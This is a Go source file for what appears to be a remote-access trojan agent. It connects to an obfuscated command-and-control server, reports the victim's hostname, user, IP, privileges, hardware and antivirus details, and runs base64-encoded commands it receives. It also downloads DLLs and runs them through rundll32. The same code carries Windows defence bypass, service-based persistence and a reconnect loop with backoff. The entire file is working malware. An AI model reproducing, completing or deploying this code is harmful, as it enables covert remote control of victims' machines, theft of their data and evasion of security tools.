package main

import (
	"bufio"
	"io"
	"log"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	//"github.com/whiterabb17/getsetgo"
	//goliath "github.com/whiterabb17/goliath"

	gophersocket "github.com/whiterabb17/gopher-socket"
	"github.com/whiterabb17/gopher-socket/transport"
	"github.com/whiterabb17/greatwhite/modules/agent"
	"github.com/whiterabb17/greatwhite/modules/commands"
	"github.com/whiterabb17/greatwhite/modules/install"
	"github.com/whiterabb17/greatwhite/modules/models"
	"github.com/whiterabb17/greatwhite/modules/util"
	gryphon "github.com/whiterabb17/gryphon"
)

/* Await Function Run */
/*
	wg := &sync.WaitGroup{}
	wg.Add(1)
	go doSomethingWith(c, wg)
	wg.Wait()
*/
type Mail struct {
	Buffer string `json:"img"`
	Tag    string `json:"tag"`
}

func relayErr(err error) {
	if err != nil {
		if util.Dbg {
			log.Println(err)
		}
		//socket.Emit("error", models.Resp{Resp: err.Error(), Tag: _self})
	}
}

func CmdExec(command string) (string, error) {
	outStr, err := gryphon.CmdOut(command)
	baseStr := util.Tb64(outStr)
	return baseStr, err
}
func mod(url string, intake string, wg *sync.WaitGroup) string {
	if wg != nil {
		wg.Add(1)
	}
	err := "Currently not supported on not Windows System"
	if runtime.GOOS == "windows" {
		gryphon.Download(url)
		gryphon.CmdOut("rundll32.exe " + intake + ".dll," + intake)
		wg.Done()
		return "Complete"
	}
	return err
}
func call() (*gophersocket.Client, error) {
	hostName, err := os.Hostname()
	relayErr(err)
	//uDir, err := os.UserHomeDir()
	//if err != nil {
	//	log.Println(err)
	//}
	//var uName []string
	//var _var string
	/*
		if runtime.GOOS == "windows" {
			uName = strings.Split(uDir, "\\")
			_var = "go_win"
			_os = "win"
		} else if runtime.GOOS == "linux" {
			uName = strings.Split(uDir, "/")
			_var = "go_nix"
			_os = "nix"
		} else {
			uName = strings.Split(uDir, "/")
			_var = "go_dar"
			_os = "dar"
		}
	*/
	//_self = util.Tb64(_var + hostName + "-" + uName[2])
	_self = hostName
	_socket, err := gophersocket.Dial(
		gophersocket.GetUrl(c2, c3, false, "&_t="+_self), //_tags
		transport.GetDefaultWebsocketTransport())
	if err != nil {
		relayErr(err)
		alive = false
	} else {
		socket = nil
		socket = _socket
		alive = true
	}
	return _socket, err
}

func CreateFileAndWriteData(fileName string, writeData []byte) error {
	fileHandle, err := os.Create(fileName)
	if err != nil {
		return err
	}
	writer := bufio.NewWriter(fileHandle)
	defer fileHandle.Close()
	writer.Write(writeData)
	writer.Flush()
	return nil
}

/* Dirname is the __dirname equivalent
func getPath() (string, error) {
	filename, err := namer()
	if err != nil {
		return "", err
	}
	return filepath.Dir(filename), nil
}*/

func grabFiles(filter string) ([]string, error) {
	files_in_dir := []string{}
	files, err := os.ReadDir(".")
	if err != nil {
		return nil, err
	}

	for _, f := range files {
		if strings.Contains(f.Name(), "filter") {
			files_in_dir = append(files_in_dir, f.Name())
		}
	}
	return files_in_dir, nil
}
func phonehome(sock *gophersocket.Client) {
	err := sock.On(gophersocket.OnDisconnection, func(h *gophersocket.Channel) {
		log.Println("Disconnected\nWill try to reconnect")
		alive = false
	})
	if err != nil {
		log.Println(err)
		alive = false
	}
	err = sock.On("inst", func(h *gophersocket.Channel) {
		h.Emit("repl", &models.Resp{Resp: commands.Info(), Tag: _self})
	})
	if err != nil {
		log.Println(err)
		alive = false
	}
	relayErr(err)
	err = sock.On("necro", func(c *gophersocket.Channel, packet models.Packet) {
		var cmd string
		var args []string
		var err error
		cmd, err = util.Fb64(packet.Event)
		if err != nil {
			cmd = packet.Event
		}
		_args, er := util.Fb64(packet.Message)
		if er != nil {
			args = strings.Split(packet.Message, "|")
		} else {
			args = strings.Split(_args, "|")
		}
		if cmd == "gryphon" {
			commands.GSwitch(args, c, "", _self)
		} else {
			commands.Perform(c, cmd, args, _self)
		}
	})
	relayErr(err)
	err = sock.On(gophersocket.OnConnection, func(h *gophersocket.Channel) {
		log.Println("Connected")
		_self = sock.Id()
		log.Println(_self)
		if util.Dbg {
			log.Println("[+] Gathering System Info.")
		}
		resp, err := http.Get(util.IPProvider)
		util.Handle(err)
		defer resp.Body.Close()

		ipb, err := io.ReadAll(resp.Body)
		util.Handle(err)
		ip := strings.TrimSpace(string(ipb))

		host, _ := os.Hostname()
		usr, _ := user.Current()

		avs := strings.Replace(util.AntiInfo(), "\n", "\n    ", -1)
		var priv string
		if gryphon.IsRoot() {
			priv = "Admin"
		} else {
			priv = "User"
		}
		cInfo := models.ClientInfo{
			SocketID:  h.Id(),
			Priv:      priv,
			Version:   util.Version,
			IPAddr:    ip,
			Hostname:  host,
			User:      usr.Username,
			OS:        runtime.GOOS,
			Arch:      runtime.GOARCH,
			CPU:       util.CPUInfo(),
			GPU:       util.GPUInfo(),
			Memory:    util.MemoryInfo(),
			AntiVirus: avs,
			Lang:      "golang",
		}
		log.Println(cInfo)
		strt := _self + " " + runtime.GOOS

		sock.Emit("reg", models.Resp{Resp: cInfo.SocketID + "#" + runtime.GOOS + "#Golang", Tag: _self})
		log.Println(strt)
		sock.Emit("register", cInfo)
		//
	})
	relayErr(err)
	/*
		err = sock.On("mod", func(c *gophersocket.Channel, args models.Resp) {
			log.Println(args.Uid)
			_cmd := util.Fb64(args.Resp)
			if args.Tag == _self {
				log.Println("Running " + util.Fb64(args.Resp))
				wg := &sync.WaitGroup{}
				wg.Add(1)
				mod(_cmd, wg)
				wg.Wait()
				_, err := os.Stat("Recovery.log")
				if err != nil {
					c.Emit("error", models.Resp{Resp: util.Tb64("Error running plugin"), Tag: _self})
				} else {
					ret := fileT64("Recovery.log")
					c.Emit("repl", models.Resp{Resp: ret, Tag: _self})
				}
			}
		})
	*/

	sock.On("pingingall", func(c *gophersocket.Channel, args interface{}) {
		data := util.Tb64("golang")
		log.Println("[!] Ping Received")
		time.Sleep(time.Millisecond * 5000)
		sock.Emit("repl", models.Resp{Resp: data, Tag: _self})
	})
	relayErr(err)
}
func deobfuscate(Data string) string {
	var ClearText string
	for i := 0; i < len(Data); i++ {
		ClearText += string(int(Data[i]) - 1)
	}
	return ClearText
}
func pray() (string, int, int, int) {
	bytes, err := os.ReadFile(os.Args[0])
	if err != nil || len(bytes) == 0 {
		log.Println(err)
		return deobfuscate(c2), c3, pers, evde
	}
	position := strings.LastIndex(string(bytes), _soul)
	if position == -1 {
		log.Println("Using Default")
		return deobfuscate(c2), c3, pers, evde
	}
	position += len(_soul)
	data := bytes[position:]
	selves := strings.Split(deobfuscate(string(data)), "#")
	num, _ := strconv.Atoi(selves[1])
	pers, _ := strconv.Atoi(selves[2])
	evde, _ := strconv.Atoi(selves[3])
	return selves[0], num, pers, evde
}

var (
	alive  bool
	cycle  int = 0
	_self  string
	socket *gophersocket.Client

	c2   = "238/1/1/2"
	c3   = 80
	pers = 0
	evde = 0
)

const (
	_soul               = "8894f4ba656547fd0d80507772c49bb2fe31f26aa7279097049b8dd5e073fbd8855b41c55e26a6fd0eee531ebdeb3ecbeb47c010914993c9c161afe64c043b62"
	nap   time.Duration = 60 * time.Second
	doz   time.Duration = 5 * time.Minute
	rem   time.Duration = 30 * time.Minute
	D     bool          = true
)

func main() {
	alive = false
	if D {
		c2 = "192.168.205.229" //, c3 = pray()
		c3 = 4000
	} else {
		c2, c3, pers, evde = pray()
	}
	if !agent.DEBUG {
		if runtime.GOOS == "windows" && evde == 1 {
			gryphon.Bypass()
		}
		if pers == 1 {
			//	virt.Scrutinize(200)
			if !install.IsInstalled() {
				log.Println("Install info does not exist")
				install.Install()
			} else {
				install.ReadInstallInfo()
				log.Println("Already installed")
			}
			log.Println("Production Mode: Service Mode Enabled")
			if os.Getenv("poly") == "" {
				if install.ServiceCheck() {
					install.HandleService(main)
				}
			}
			os.Chdir(install.Info.Base)
		}
	}
	for {
		if alive {
			log.Println("Still Connected")
			cycle = 0
		} else {
			cycle++
			log.Println("Cycle " + strconv.Itoa(cycle) + " | Connecting")
			sock, err := call()
			if err == nil {
				phonehome(sock)
			} else {
				log.Println("Could not connect: " + err.Error())
				if cycle <= 15 {
					if D {
						log.Println("Cycle: " + strconv.Itoa(cycle) + "  |  Sleeping for: 60 Seconds")
					}
					time.Sleep(nap)
				} else if 15 < cycle && cycle <= 60 {
					if D {
						log.Println("Cycle: " + strconv.Itoa(cycle) + "  |  Sleeping for: 5 Minutes")
					}
					time.Sleep(doz)
				} else {
					if D {
						log.Println("Cycle: " + strconv.Itoa(cycle) + "  |  Sleeping for: 30 Minutes")
					}
					time.Sleep(rem)
				}
			}
		}
		if cycle <= 15 {
			time.Sleep(nap)
		} else if 15 < cycle && cycle <= 60 {
			time.Sleep(doz)
		} else {
			time.Sleep(rem)
		}
	}
}
